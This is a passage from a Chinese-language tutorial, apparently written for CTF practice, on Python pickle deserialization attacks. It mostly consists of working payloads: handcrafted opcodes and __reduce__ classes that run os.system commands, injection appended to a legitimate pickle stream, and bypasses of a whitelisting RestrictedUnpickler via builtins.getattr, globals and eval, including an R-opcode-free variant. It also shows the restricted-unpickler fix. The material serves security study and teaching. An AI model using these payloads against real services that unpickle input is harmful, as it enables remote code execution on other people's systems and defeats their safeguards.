    fakeUser = pickle.loads(opcode)
    print(fakeUser.admin,fakeUser.guest)
    # True False
#### 变量覆盖
我们也可以直接进行变量覆盖，示例
    import pickle
    import secret
    print("secret:"+secret.secret)
    opcode=b'''c__main__
    secret
    (S'secret'
    S'Hacker!!!'
    db.'''
    fake=pickle.loads(opcode)
    print("fakesecret:"+fake.secret)
    #secret:sp4c1ous
    #fakesecret:Hacker!!!
用到的 opcode：
    opcode=b'''c__main__
    secret
    (S'secret' # secret 内的 secret 属性
    S'Hacker!!!' # 指定要替换的内容
    db.'''  # d创建空的dict然后 b 取前一个 Hacker!!! 进行update 这里的具体解释可以看到下面的 b 绕过 R 的部分
#### RCE
在攻击中我们的目的肯定最终是利用序列化的内容实现我们想要实现的操作，这里以RCE为例进行介绍，基本的构造如下：
    c
    (
    tR
填充上内容也就是：
    cos
    system #引入 os 模块的 system 方法，这里实际上是一步将函数添加到 stack 的操作
    (S'ls' # 把当前 stack 存到 metastack，清空 stack，再将 'ls' 压入 stack
    tR. # t 也就是将 stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack
    ​    # R 的内容就成为了 system(*('ls',)) ，然后 . 代表结束，返回当前栈顶元素
     __import__('os').system(*('ls',))
这样就是一个最基础的 getshell 的构造，这里要回去看一下指令集，看一下这里用到的几种指令码。
其中 c 操作码指向的实际上是一个 `self.find_class(modname, name);` 可以在源码中找到
    def find_class(self, module, name):
            # Subclasses may override this.
            if self.proto = 4:
                return _getattribute(sys.modules[module], name)[0]
            else:
                return getattr(sys.modules[module], name)
可以在 `load_global` 中看到具体的实现，其中的 getattr 是通过 sys.modules
获取变量名的或者模块的，`sys.modules`是一个全局字典，我们可以从其中 get 到我们想要的属性，只要 python 启动 sys.modules
就会将模块导入字典中。
    import sys
    import secret
    print(getattr(sys.modules['__main__'],'secret'))
    # 
这样的 opcode 被我们 pickle.loads 的话就会导致 RCE
我们还可以重写类的 `object.__reduce__()` 函数，使之在被实例化时按照重写的方式进行，对应opcode当中的R指令
    import pickle
    import os
    class Test(object):
        def __reduce__(self):
            return (os.system,('calc',))
    print(pickle.dumps(Test(), protocol=0))
    # b'cnt\nsystem\np0\n(Vcalc\np1\ntp2\nRp3\n.'
利用 pickle 的 `__reduce__` 可以直接用它的操作模式实现我们上面手搓的
`__import__('os').system(*('ls',))` 的构造。（ 缺点：只能执行单一的函数，很难构造复杂的操作 ）
但是这种指令码在现在的 CTF 中已经很难生效了，通常都会对指令码进行过滤，需要我们结合对整个过程的理解来进行绕过。
在pickle中，和函数执行的字节码有三个：`R`、`i`、`o`，`R` 已经说过了，我们具体再看看 `i` 和 `o`
  * `i` 其实就相当于 c 和 o 的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
        INST           = b'i'   # build & push class instance
    GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
    OBJ            = b'o'   # build & push class instance
示例：
`python opcode=b'''(S'calc' ios system .'''`
  * `o`：寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）
`python opcode=b'''(cos system S'calc' o.'''`
>
> 注意：部分Linux系统下和Windows下的opcode字节流并不兼容，比如Windows下执行系统命令函数为`os.system()`，在部分Linux下则为`posix.system()`
同时，我们可以发现`pickle.loads` 是可以自动 import 的，这一点为我们的攻击提供了方便。
##### 攻击情景
我们可以看到 opcode 都会以 `.` 结束，我们在程序正常的 opcode 之后去掉 `.` 再拼接上我们的内容即可命令执行
    import opcode
    import pickle
    import pickletools
    class User:
        def __init__(self,admin,guest):
            self.admin=admin
            self.guest=guest
    opcode = b'\x80\x03c__main__\nUser\nq\x00)\x81q\x01}q\x02(X\x05\x00\x00\x00adminq\x03\x88X\x05\x00\x00\x00guestq\x04\x89ubcnt\nsystem\np0\n(Vcalc\np1\ntp2\nRp3\n.'
    fakeUser = pickle.loads(opcode)
### 漏洞修复
和其他的反序列化漏洞一样，永远不要相信用户的输入，确保 unpickle 的内容不会来自于不受信任的或者未经验证的来源的数据。
在这一点之外，我们还可以通过重写 `Unpickler.find_class()` 来限制全局变量：
    import builtins
    import io
    import pickle
    safe_builtins = {
        'range',
        'complex',
        'set',
        'frozenset',
        'slice',
    }
    class RestrictedUnpickler(pickle.Unpickler):
        #重写了find_class方法
        def find_class(self, module, name):
            # Only allow safe classes from builtins.
            if module == "builtins" and name in safe_builtins:
                return getattr(builtins, name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                         (module, name))
    def restricted_loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
    opcode=b"cos\nsystem\n(S'echo hello world'\ntR."
    restricted_loads(opcode)
    ###结果如下
    Traceback (most recent call last):
    ...
    _pickle.UnpicklingError: global 'os.system' is forbidden
以上例子通过重写`Unpickler.find_class()`方法，限制调用模块只能为`builtins`，且函数必须在白名单内，否则抛出异常。这种方式限制了调用的模块函数都在白名单之内，这就保证了Python在`unpickle`时的安全性。
### 漏洞 bypass
#### 绕过`find_class`函数
我们在前面学习到了 `c` 操作码调用的 find_class 的逻辑，我们可以看到上面官方的修复方法中也是对 find_class
进行白名单限制，比如这里我们限制了 `builtins` ，但是显然我们可以通过自己构造类似 find_class 的逻辑进行 payload 构造，我们
c 操作码只需要对 `builtins` 进行操作就可以构造出 payload
我们可以利用 如下代码进行绕过
    opcode=b'''cbuiltins
    getattr
    p0                    #取到 getattr
    (cbuiltins
    dict
    S'get'
    tRp1
    cbuiltins
    globals
    )Rp2                  # getattr(dict, 'get')
    00g1
    (g2
    S'__builtins__'       # get(__import__('builtins').globals(), '__builtins__')
    tRp3
    0g0
    (g3
    S'eval'
    tR(S'__import__("os").system("calc")'    # 取到 eval 然后实现 RCE
    tR.
    '''
R 被过滤的时候，构造如下
    opcode=b'\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__("os").system("calc")o00.'#最后两个0是栈为空，否则会报错
    '''
        0: \x80 PROTO      3
        2: (    MARK
        3: c        GLOBAL     'builtins getattr'
       21: p        PUT        0
       24: c        GLOBAL     'builtins dict'
       39: p        PUT        1
       42: X        BINUNICODE 'get'
       50: o        OBJ        (MARK at 2)
       51: p    PUT        2
       54: 0    POP
       55: (    MARK
       56: g        GET        2
       59: (        MARK
       60: c            GLOBAL     'builtins globals'
       78: o            OBJ        (MARK at 59)
       79: X        BINUNICODE '__builtins__'
       96: o        OBJ        (MARK at 55)
       97: p    PUT        3
      100: (    MARK
      101: g        GET        0
      104: g        GET        3
      107: X        BINUNICODE 'eval'
      116: o        OBJ        (MARK at 100)
      117: p    PUT        4
      120: (    MARK
      121: g        GET        4
      124: X        BINUNICODE '__import__("os").system("whoami")'
      162: o        OBJ        (MARK at 120)
      163: 0    POP
      164: 0    POP
      165: .    STOP
    highest protocol among opcodes = 2
    '''
#### R 指令被过滤
##### `b`
上面 RCE 中我们提到了，我们可以使用 `o` 、`i` 来进行绕过，这里重点提一下 `b`
    BUILD          = b'b'   # call __setstate__ or __dict__.update()
我们可以看到 b 指令码的作用，这里会调用到 `__setstate__`
> `__setstate__` ： [官方文档](https://docs.python.org/zh-> cn/3.7/library/pickle.html#handling-stateful-> objects)中，如果想要存储对象的状态，就可以使用`__getstat__`和`__setstat__`方法。由于 pickle
> 同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄`open(file,'r')`。
和他成对的还有 `__getstate__`
，被反序列化时调用`__setstate__`，被序列化时调用`__getstate__`。重写时可以省略`__setstate__`，但`__getstate__`必须返回一个字典。如果`__getstate__`与`__setstate__`都被省略,
那么就默认自动保存和加载对象的属性字典`__dict__`。
示例：
    import pickle
    class Person:
        def __init__(self, name, age=0):
            self.name = name
            self.age = age
        def __str__(self):
            return f"name: {self.name}\nage: {self.age}"
    class Child(Person):
        def __setstate__(self, state):
            print("invoke __setstate__")
            self.name=state
            self.age=10
        def __getstate__(self):
            print("invoke __getstate__")
            return "Child"
    child=Child("TEST",123)
    print(child)
    #name: TEST
    #age: 123
    opcode=pickle.dumps(child,protocol=0)
    print(opcode)
    #invoke __getstate__
    #b'ccopy_reg\n_reconstructor\np0\n(c__main__\nChild\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\nVChild\np5\nb.'
    c1=pickle.loads(opcode)
    print(c1)
    #invoke __setstate__
    #name: Child